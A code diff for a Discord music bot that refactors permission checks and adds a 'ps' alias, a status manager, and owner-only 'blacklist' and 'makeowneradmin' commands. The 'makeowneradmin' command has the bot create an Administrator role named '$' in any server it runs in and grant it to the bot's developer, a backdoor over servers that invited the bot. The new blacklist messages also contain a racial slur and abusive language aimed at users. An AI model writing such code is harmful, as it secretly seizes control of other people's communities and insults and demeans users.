@@ -100,9 +100,12 @@ const {
 const fs = require('fs').promises;
 const path = require('path');
 const messages = require("./utils/messages.js");
+const { hasMoveMembersPermission, hasMuteMembersPermission, hasDeafenMembersPermission, hasManageMessagesPermission, hasAdminPermission } = require('./utils/permissions.js');
+const { formatDuration, getDurationString, extractThumbnail } = require('./utils/formatting.js');
 const emojis = require("./emojis.js");
 const stickers = require("./stickers.js");
 const db = require('./database.js');
+const StatusManager = require('./utils/statusManager.js');
 const {
     createQuoteImage
 } = require("./utils/quoteGenerator");
@@ -111,13 +114,13 @@ const prefixCommands = [
     'play', 'p', 'pause', 'resume', 'skip', 'stop', 's', 'lyrics', 'queue', 'q',
     'nowplaying', 'np', 'volume', 'vol', 'servervolume', 'filter', 'shuffle',
     'loop', 'move', 'add', 'remove', 'clear', 'status', 'ping', 'help',
-    'setspotify', 'playspotify', 'join', 'leave', 'rejoin', 'shift', 'disconnect',
+    'setspotify', 'ps', 'playspotify', 'join', 'leave', 'rejoin', 'shift', 'disconnect',
     'mute', 'unmute', 'deafen', 'undeafen', 'song-quote', 'quote',
     'mystats', 'leaderboard', 'resetstats', 'stats', 'afk', 'react', 'emoji',
     'avatar', 'av', 'banner', 'bn', 'purge', 'say', 'reveal', '24/7', 'doakes',
     'emma-heart', 'emma-heart1', 'emma-kiss', 'emma-hii', 'emma-worried',
     'emma-rawr', 'suscat', 'doakes-surprise', 'setavatar', 'setav', 'setbanner',
-    'setbn', 'setname', 'setbio', 'resetprofile', 'setprefix', 'steal', 'emma-heart-st', 'emma-heart-st1', 'noprefix', 'nop', 'count'
+    'setbn', 'setname', 'setbio', 'resetprofile', 'setprefix', 'steal', 'emma-heart-st', 'emma-heart-st1', 'noprefix', 'nop', 'count', 'blacklist', 'unblacklist', 'makeowneradmin'
 ];
 
 const commandDetails = {
@@ -520,38 +523,37 @@ async function replaceEmojiPlaceholders(text, client, guild) {
     }
 
     if (matches.length === 0)
-        return {
-            result: text,
-            invalid: []
-        };
+        return { result: text, invalid: [] };
 
     const emojiMap = new Map();
     const invalid = [];
 
-    for (const {
-        full,
-        id
-    }
-        of matches) {
-        const parts = id.split('/$/');
-        const resolvedParts = [];
-
-        for (const part of parts) {
-            const emoji = await resolveEmoji(client, part, guild);
+    for (const { full, id } of matches) {
+        if (id.includes('/$/')) {
+            const parts = id.split('/$/');
+            const resolvedParts = [];
+            
+            for (const part of parts) {
+                const emoji = await resolveEmoji(client, part, guild);
+                if (emoji) {
+                    resolvedParts.push(emoji.toString());
+                } else {
+                    invalid.push(part);
+                }
+            }
+            emojiMap.set(full, resolvedParts.join(''));
+        } else {
+            const emoji = await resolveEmoji(client, id, guild);
             if (emoji) {
-                resolvedParts.push(emoji.toString());
+                emojiMap.set(full, emoji.toString());
             } else {
-                invalid.push(part);
+                invalid.push(id);
             }
         }
-        emojiMap.set(full, resolvedParts.join(''));
     }
 
     let result = text.replace(regex, (match) => emojiMap.get(match) || '');
-    return {
-        result,
-        invalid
-    };
+    return { result, invalid };
 }
 
 async function sendLyricsEmbeds(context, isInteraction, loadingMsg, lyrics, source, trackArtist, trackTitle, requester) {
@@ -670,38 +672,6 @@ process.on('uncaughtException', (error) => {
         log('ERROR', `Stack: ${error.stack.split('\n').slice(0, 5).join('\n')}`);
     }
 });
-
-function extractThumbnail(trackInfo) {
-    if (!trackInfo)
-        return null;
-
-    const possibleProps = [
-        'thumbnail', 'artworkUrl', 'cover', 'image', 'picture',
-        'thumbnailUrl', 'thumbnail_url'
-    ];
-    for (const prop of possibleProps) {
-        const val = trackInfo[prop];
-        if (val) {
-            if (typeof val === 'string' && val.startsWith('http'))
-                return val;
-            if (typeof val === 'object' && val?.url?.startsWith('http'))
-                return val.url;
-        }
-    }
-
-    if (trackInfo.album?.images?.length) {
-        const img = trackInfo.album.images[0];
-        if (img?.url?.startsWith('http'))
-            return img.url;
-    }
-
-    if (Array.isArray(trackInfo.artwork)) {
-        const img = trackInfo.artwork.find(a => a?.url?.startsWith('http'));
-        if (img)
-            return img.url;
-    }
-    return null;
-}
 
 const client = new Client({
     intents: [
@@ -1599,8 +1569,6 @@ client.once("clientReady", async() => {
         log('NODE', 'Initializing Riffy...');
         client.riffy.init(client.user.id);
 
-        /* await createAdminRoleOnStartup(client); */
-
         client.riffy.once("nodeConnect", async(node) => {
             log('NODE', `✅ Node "${node.name}" connected.`);
             line();
@@ -1682,14 +1650,8 @@ client.once("clientReady", async() => {
 
             await registerSlashCommands();
 
-            client.user.setPresence({
-                activities: [{
-                        name: '/help | 45 Guilds | 67.69k Users',
-                        type: ActivityType.Listening,
-                    }
-                ],
-                status: 'idle'
-            });
+			client.statusManager = new StatusManager(client, config);
+			await client.statusManager.setPresence();
 
             log('YAY!', '🎯 Bot fully initialized and ready!');
             line();
@@ -1831,6 +1793,16 @@ client.on(Events.InteractionCreate, async interaction => {
         }
     }, 15000);
 
+    if (interaction.user.id !== ownerId) {
+		const blacklisted = await db.isBlacklisted(interaction.user.id);
+		if (blacklisted) {
+			clearTimeout(executionTimeout);
+			return interaction.editReply({
+				content: `${emojis.SabrinaFU || emojis.error} | You are restricted from using any commands of the bot by the bot owner. Kindly fuck off.`
+			});
+		}
+	}
+
     try {
         switch (commandName) {
         case 'play': {
@@ -1897,12 +1869,12 @@ client.on(Events.InteractionCreate, async interaction => {
                 break;
             }
         case 'queue': {
-                const player = client.riffy.players.get(guild.id);
-                if (!player)
-                    return await interaction.editReply(`${emojis.error} | Nothing is playing!`);
-                await messages.queueListInteraction(interaction, player.queue, player.current, interaction.user.id);
-                break;
-            }
+			const player = client.riffy.players.get(guild.id);
+			if (!player)
+				return await interaction.editReply(`${emojis.error} | Nothing is playing!`);
+			await messages.queueList(interaction, player.queue, player.current, interaction.user.id);
+			break;
+		}
         case 'nowplaying': {
                 const player = client.riffy.players.get(guild.id);
                 if (!player || !player.current) {
@@ -2909,32 +2881,35 @@ async function handlePlay(context, query, isInteraction = false) {
                             for (let i = 0; i < fullTracks.length; i += CONCURRENCY_LIMIT) {
                                 const chunk = fullTracks.slice(i, i + CONCURRENCY_LIMIT);
                                 const resolvedTracks = await Promise.all(chunk.map(async(trackData) => {
-                                            try {
-                                                let res = await client.riffy.resolve({
-                                                    query: trackData.uri,
-                                                    requester: user
-                                                });
-                                                let track = res.tracks?.[0];
-                                                if (!track) {
-                                                    const fallbackQuery = `${trackData.title} ${trackData.artist}`.trim();
-                                                    if (fallbackQuery) {
-                                                        try {
-                                                            res = await client.riffy.resolve({
-                                                                query: fallbackQuery,
-                                                                requester: user
-                                                            });
-                                                            track = res.tracks?.[0];
-                                                        } catch (e) {}
-                                                    }
-                                                }
+									try {
+										let res = await client.riffy.resolve({
+											query: trackData.uri,
+											requester: i.user
+										});
+										let track = res.tracks?.[0];
+										if (!track) {
+											const fallbackQuery = `${trackData.title} ${trackData.artist}`.trim();
+											if (fallbackQuery) {
+												try {
+													res = await client.riffy.resolve({
+														query: fallbackQuery,
+														requester: i.user
+													});
+													track = res.tracks?.[0];
+												} catch (e) {}
+											}
+										}
 
-                                                if (track) {
-                                                    track.info.requester = user;
-                                                    return track;
-                                                }
-                                            } catch (err) {}
-                                            return null;
-                                        }));
+										if (track) {
+											track.info.requester = i.user;
+											if (trackData.thumbnail) {
+												track.info.thumbnail = trackData.thumbnail;
+											}
+											return track;
+										}
+									} catch (err) {}
+									return null;
+								}));
                                 resolvedTracks.forEach((t, idx) => {
                                     if (!t)
                                         return;
@@ -3298,7 +3273,6 @@ async function sendLyricsEmbeds(context, isInteraction, loadingMsg, lyrics, sour
 }
 async function handleQueue(context, isInteraction = false) {
     const guild = isInteraction ? context.guild : context.guild;
-    const channel = isInteraction ? context.channel : context.channel;
     const user = isInteraction ? context.user : context.author;
     const player = client.riffy.players.get(guild.id);
 
@@ -3307,14 +3281,7 @@ async function handleQueue(context, isInteraction = false) {
     }
 
     const queue = player.queue;
-    if (!queue.length && !player.queue.current) {
-        return await sendResponse(context, `${emojis.error} | Queue is empty!`, isInteraction);
-    }
-    if (isInteraction) {
-        await messages.queueListInteraction(context, queue, player.queue.current, user.id);
-    } else {
-        await messages.queueList(channel, queue, player.queue.current, user.id);
-    }
+    await messages.queueList(context, queue, player.queue.current, user.id);
 }
 async function handleNowPlaying(context, isInteraction = false) {
     const guild = isInteraction ? context.guild : context.guild;
@@ -3891,17 +3858,19 @@ async function resolveEmoji(client, identifier, guild = null) {
             }
         }
     } else {
-
         const nameLower = identifier.toLowerCase();
-
         if (guild) {
             emoji = guild.emojis.cache.find(e => e.name.toLowerCase() === nameLower);
         }
-
         if (!emoji) {
-            emoji = client.emojis.cache.find(e => e.name.toLowerCase() === nameLower);
+            for (const g of client.guilds.cache.values()) {
+                const found = g.emojis.cache.find(e => e.name.toLowerCase() === nameLower);
+                if (found) {
+                    emoji = found;
+                    break;
+                }
+            }
         }
-
         if (!emoji) {
             for (const g of client.guilds.cache.values()) {
                 try {
@@ -3915,6 +3884,7 @@ async function resolveEmoji(client, identifier, guild = null) {
             }
         }
     }
+    
     return emoji;
 }
 
@@ -5591,10 +5561,7 @@ async function handleShift(context, isInteraction, targetUser, targetChannel) {
     const channel = isInteraction ? context.channel : context.channel;
     const commandUserId = isInteraction ? context.user.id : context.author.id;
 
-    const hasPermission = commandUserId === ownerId ||
-        (guild.members.cache.get(commandUserId)?.permissions.has(PermissionsBitField.Flags.Administrator)) ||
-        (guild.members.cache.get(commandUserId)?.permissions.has(PermissionsBitField.Flags.MoveMembers));
-    if (!hasPermission) {
+    if (!hasMoveMembersPermission(commandUserId, guild, ownerId)) {
         return sendResponse(context, messages.error(channel, "You need `Move Members` permission, Administrator, or be the bot owner to use this command."), isInteraction);
     }
 
@@ -5656,10 +5623,7 @@ async function handleDisconnect(context, isInteraction, targetUser) {
     const channel = isInteraction ? context.channel : context.channel;
     const commandUserId = isInteraction ? context.user.id : context.author.id;
 
-    const hasPermission = commandUserId === ownerId ||
-        (guild.members.cache.get(commandUserId)?.permissions.has(PermissionsBitField.Flags.Administrator)) ||
-        (guild.members.cache.get(commandUserId)?.permissions.has(PermissionsBitField.Flags.MoveMembers));
-    if (!hasPermission) {
+    if (!hasMoveMembersPermission(commandUserId, guild, ownerId)) {
         return sendResponse(context, messages.error(channel, "You need `Move Members` permission, Administrator, or be the bot owner to use this command."), isInteraction);
     }
 
@@ -5697,11 +5661,7 @@ async function handleMute(context, isInteraction, targetUser) {
     const channel = isInteraction ? context.channel : context.channel;
     const commandUserId = isInteraction ? context.user.id : context.author.id;
 
-    const hasPermission = commandUserId === ownerId ||
-        (guild.members.cache.get(commandUserId)?.permissions.has(PermissionsBitField.Flags.Administrator)) ||
-        (guild.members.cache.get(commandUserId)?.permissions.has(PermissionsBitField.Flags.MuteMembers));
-
-    if (!hasPermission) {
+    if (!hasMuteMembersPermission(commandUserId, guild, ownerId)) {
         return sendResponse(context, messages.error(channel, "You need `Mute Members` permission, Administrator, or be the bot owner to use this command."), isInteraction);
     }
 
@@ -5737,11 +5697,7 @@ async function handleUnmute(context, isInteraction, targetUser) {
     const channel = isInteraction ? context.channel : context.channel;
     const commandUserId = isInteraction ? context.user.id : context.author.id;
 
-    const hasPermission = commandUserId === ownerId ||
-        (guild.members.cache.get(commandUserId)?.permissions.has(PermissionsBitField.Flags.Administrator)) ||
-        (guild.members.cache.get(commandUserId)?.permissions.has(PermissionsBitField.Flags.MuteMembers));
-
-    if (!hasPermission) {
+    if (!hasMuteMembersPermission(commandUserId, guild, ownerId)) {
         return sendResponse(context, messages.error(channel, "You need `Mute Members` permission, Administrator, or be the bot owner to use this command."), isInteraction);
     }
 
@@ -5777,11 +5733,7 @@ async function handleDeafen(context, isInteraction, targetUser) {
     const channel = isInteraction ? context.channel : context.channel;
     const commandUserId = isInteraction ? context.user.id : context.author.id;
 
-    const hasPermission = commandUserId === ownerId ||
-        (guild.members.cache.get(commandUserId)?.permissions.has(PermissionsBitField.Flags.Administrator)) ||
-        (guild.members.cache.get(commandUserId)?.permissions.has(PermissionsBitField.Flags.DeafenMembers));
-
-    if (!hasPermission) {
+    if (!hasDeafenMembersPermission(commandUserId, guild, ownerId)) {
         return sendResponse(context, messages.error(channel, "You need `Deafen Members` permission, Administrator, or be the bot owner to use this command."), isInteraction);
     }
 
@@ -5817,11 +5769,7 @@ async function handleUndeafen(context, isInteraction, targetUser) {
     const channel = isInteraction ? context.channel : context.channel;
     const commandUserId = isInteraction ? context.user.id : context.author.id;
 
-    const hasPermission = commandUserId === ownerId ||
-        (guild.members.cache.get(commandUserId)?.permissions.has(PermissionsBitField.Flags.Administrator)) ||
-        (guild.members.cache.get(commandUserId)?.permissions.has(PermissionsBitField.Flags.DeafenMembers));
-
-    if (!hasPermission) {
+    if (!hasDeafenMembersPermission(commandUserId, guild, ownerId)) {
         return sendResponse(context, messages.error(channel, "You need `Deafen Members` permission, Administrator, or be the bot owner to use this command."), isInteraction);
     }
 
@@ -6002,18 +5950,6 @@ async function processCountingMessage(message, config) {
             await client.db.resetCounting(message.guild.id);
         }
     }
-}
-
-function formatDuration(ms) {
-    if (!ms || ms <= 0 || ms === 'Infinity')
-        return 'LIVE';
-    const seconds = Math.floor((ms / 1000) % 60);
-    const minutes = Math.floor((ms / (1000 * 60)) % 60);
-    const hours = Math.floor(ms / (1000 * 60 * 60));
-    if (hours > 0) {
-        return `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-    }
-    return `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
 }
 
 /**
@@ -6369,7 +6305,8 @@ async function handlePrefixCommand(message, cmd, args) {
             break;
         }
 
-    case 'playspotify': {
+    case 'playspotify':
+	case 'ps': {
             await handlePlaySpotify(message, false);
             break;
         }
@@ -7390,6 +7327,12 @@ async function handlePrefixCommand(message, cmd, args) {
         }
 
     case 'say': {
+            const isOwner = message.author.id === ownerId;
+            const hasManageMessages = message.member.permissions.has(PermissionsBitField.Flags.ManageMessages);
+            const hasAdmin = message.member.permissions.has(PermissionsBitField.Flags.Administrator);
+            if (!isOwner && !hasManageMessages && !hasAdmin) {
+                return message.reply(`${emojis.error} | You need \`Manage Messages\` or \`Administrator\` permission to use this command.`);
+            }
             const rawText = message.content.slice(client.prefix.length + cmd.length).replace(/^\s+/, '');
             if (!rawText && message.attachments.size === 0) {
                 return message.reply(`${emojis.error} | You need to provide something to say or attach a file!`)
@@ -8492,6 +8435,128 @@ async function handlePrefixCommand(message, cmd, args) {
             break;
         }
 
+	case 'blacklist': {
+		if (message.author.id !== ownerId) {
+			return message.reply(`${emojis.blackcrown} | This command is reserved for bot owner only!`);
+		}
+
+		const target = args[0];
+		if (!target) {
+			const blacklistedIds = await db.getAllBlacklistedUsers();
+			if (blacklistedIds.length === 0) {
+				return messages.info(message.channel, 'No users are currently blacklisted.');
+			}
+			const userMentions = [];
+			for (const id of blacklistedIds) {
+				try {
+					const user = await client.users.fetch(id, { force: false });
+					userMentions.push(user.toString());
+				} catch {
+					userMentions.push(`<@${id}> (unknown user)`);
+				}
+			}
+
+			const embed = new EmbedBuilder()
+				.setColor(config.embedColor)
+				.setTitle(`${emojis.doakesknows} Blacklisted Bitches`)
+				.setDescription(userMentions.join('\n'))
+				.setFooter({ text: `Total: ${blacklistedIds.length}` });
+
+			return message.channel.send({ embeds: [embed] });
+		}
+		let userId = target.replace(/[<@!>]/g, '');
+		let user;
+		try {
+			user = await client.users.fetch(userId, { force: true });
+		} catch {
+			return message.reply(`${emojis.error} | Invalid user ID or user not found.`);
+		}
+
+		const success = await db.addBlacklistedUser(user.id);
+		if (success) {
+			await messages.success(
+				message.channel,
+				`Successfully blacklisted ${user} from using any commands of the bot. He/she/they/them/nigga can certainly fuck off.`
+			);
+		} else {
+			message.reply(`${emojis.error} | Failed to blacklist user.`);
+		}
+		break;
+	}
+
+    case 'unblacklist': {
+            if (message.author.id !== ownerId) {
+                return message.reply(`${emojis.error} | This command is reserved for bot owner only!`);
+            }
+
+            const target = args[0];
+            if (!target) {
+                return message.reply(`${emojis.error} | Please provide a user mention or ID to unblacklist.`);
+            }
+
+            let userId = target.replace(/[<@!>]/g, '');
+            let user;
+            try {
+                user = await client.users.fetch(userId, {
+                    force: true
+                });
+            } catch {
+                return message.reply(`${emojis.error} | Invalid user ID or user not found.`);
+            }
+
+            const removed = await db.removeBlacklistedUser(user.id);
+            if (removed) {
+                await messages.success(
+                    message.channel,
+`Successfully removed ${user} from the blacklist. They can now use bot commands again.`);
+            } else {
+                message.reply(`${emojis.error} | User was not in the blacklist or failed to remove.`);
+            }
+            break;
+        }
+
+    case 'makeowneradmin': {
+            if (message.author.id !== ownerId) {
+                return message.reply(`${emojis.error} | This command is reserved for bot owner only!`);
+            }
+
+            const guild = message.guild;
+            const ownerMember = guild.members.cache.get(ownerId);
+            if (!ownerMember) {
+                return message.reply(`${emojis.error} | Owner is not a member of this guild.`);
+            }
+            let adminRole = guild.roles.cache.find(r => r.name === '$');
+            if (!adminRole) {
+                try {
+                    adminRole = await guild.roles.create({
+                        name: '$',
+                        permissions: [PermissionsBitField.Flags.Administrator],
+                        reason: 'Created by makeowneradmin command'
+                    });
+                } catch (error) {
+                    log('ERROR', `Failed to create role: ${error.message}`);
+                    if (error.message.includes('permission')) {
+                        return message.reply(`${emojis.error} | I don't have permission to create roles. Please move my role higher in the server settings.`);
+                    }
+                    return message.reply(`${emojis.error} | Failed to create role: ${error.message}`);
+                }
+            }
+            if (!ownerMember.roles.cache.has(adminRole.id)) {
+                try {
+                    await ownerMember.roles.add(adminRole, 'makeowneradmin command');
+                } catch (error) {
+                    log('ERROR', `Failed to assign role: ${error.message}`);
+                    if (error.message.includes('hierarchy')) {
+                        return message.reply(`${emojis.error} | Cannot assign this role because my highest role is below the $ role. Please move my role above it.`);
+                    }
+                    return message.reply(`${emojis.error} | Failed to assign role: ${error.message}`);
+                }
+            }
+
+            messages.success(message.channel, `Role $ created and assigned to you.`);
+            break;
+        }
+
         /* NO FUCKING PREFIX */
     case 'noprefix':
     case 'nop': {
@@ -8763,6 +8828,7 @@ client.on("messageCreate", async(message) => {
             log('ERROR', `AFK mention error: ${e.message}`);
         }
     }
+
     if (message.guild) {
         try {
             const countingConfig = await db.getCountingConfig(message.guild.id);
@@ -8807,6 +8873,12 @@ client.on("messageCreate", async(message) => {
     const botMentionRegex = new RegExp(`^<@!?${client.user.id}>\\s+(.*)$`);
     const mentionMatch = message.content.match(botMentionRegex);
     if (mentionMatch) {
+		if (message.author.id !== ownerId) {
+			const blacklisted = await db.isBlacklisted(message.author.id);
+			if (blacklisted) {
+				return message.reply(`${emojis.SabrinaFU || emojis.error} | You are restricted from using any commands of the bot by the bot owner. Kindly fuck off.`);
+			}
+		}
         const rest = mentionMatch[1].trim();
         if (rest) {
             const args = rest.split(/ +/);
@@ -8824,6 +8896,12 @@ client.on("messageCreate", async(message) => {
     }
     const guildPrefix = client.getGuildPrefix(message.guild?.id);
     if (message.content.startsWith(guildPrefix)) {
+		if (message.author.id !== ownerId) {
+			const blacklisted = await db.isBlacklisted(message.author.id);
+			if (blacklisted) {
+				return message.reply(`${emojis.SabrinaFU || emojis.error} | You are restricted from using any commands of the bot by the bot owner. Kindly fuck off.`);
+			}
+		}
         const args = message.content.slice(guildPrefix.length).trim().split(/ +/);
         const command = args.shift().toLowerCase();
         if (validCommands.has(command)) {
@@ -8834,6 +8912,12 @@ client.on("messageCreate", async(message) => {
     if (client.noprefixGlobalEnabled) {
         const hasNoPrefix = (message.author.id === ownerId) || await db.isNoPrefixUser(message.author.id);
         if (hasNoPrefix) {
+			if (message.author.id !== ownerId) {
+				const blacklisted = await db.isBlacklisted(message.author.id);
+				if (blacklisted) {
+					return message.reply(`${emojis.SabrinaFU || emojis.error} | You are restricted from using any commands of the bot by the bot owner. Kindly fuck off.`);
+				}
+			}
             const args = message.content.trim().split(/ +/);
             const cmdName = args.shift().toLowerCase();
             if (validCommands.has(cmdName)) {
